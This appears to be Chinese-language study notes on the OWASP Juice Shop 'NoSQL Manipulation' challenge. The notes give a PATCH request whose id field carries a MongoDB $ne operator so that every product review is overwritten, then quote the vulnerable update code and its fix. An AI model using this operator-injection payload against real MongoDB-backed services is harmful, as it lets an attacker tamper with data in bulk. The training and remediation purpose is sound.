---
title: NoSQL Manipulation
description: pass
---
- 描述：同时更新多个产品评论。
- 关联挑战 NoSQL DoS
- 已知 MongoDB 的 whrer 子句注入点 
    ```GET /rest/products/注入点/reviews HTTP/1.1```
- 查看示例解决方案：使用 PATCH 方法。
    探测方向错误，集中在 PUT 方法上，而 PUT 方法的参数作为字符串无法逃逸
- 在```main.js```中
    ```javascript
    patch(e) {
        return this.http.patch(this.host + "/reviews", e).pipe((0, b.T)(o => o.data), (0, g.W)(o => {
            throw o
        }))
    }
    ```
    - 路径为 ```PATCH /rest/products/reviews HTTP/1.1```
        ```json
        {
            "id":"ETEjcB7g2FtFhHeWX",
            "message":"z",
            "author":"admin@juice-sh.op"
        }
        ```
    - 对 id 参数进行注入，使用查询操作符 $ne 来匹配所有不等于指定值的值。
        ```json
        {
            "id": {
                "$ne": "invalid"
            },
            "message": "z",
            "author": "admin@juice-sh.op"
        }
        ```
- 代码挑战
    ```typescript
    export function updateProductReviews () {
	  return (req: Request, res: Response, next: NextFunction) => {
	    const user = security.authenticatedUsers.from(req)
	    db.reviewsCollection.update(
	      { _id: req.body.id },
	      { $set: { message: req.body.message } },
	      { multi: true }
	    ).then(
	      (result: { modified: number, original: Array<{ author: any }> }) => {
	        res.json(result)
	      }, (err: unknown) => {
	        res.status(500).json(err)
	      })
	  }
	}
    ```
    - 漏洞在于
        - ```{ _id: req.body.id }```
        查询处输入 JSON 形式而不是字符串
        - ```{ multi: true }```
        允许更新多条
    - 修复：检测类型是否匹配，且移除多条更新的设置
        ```typescript
        if (typeof req.body.id !== 'string') {
            res.status(400).send()
            return
        }

        db.reviewsCollection.update(
	      { _id: req.body.id },
	      { $set: { message: req.body.message } },
	    )
        ```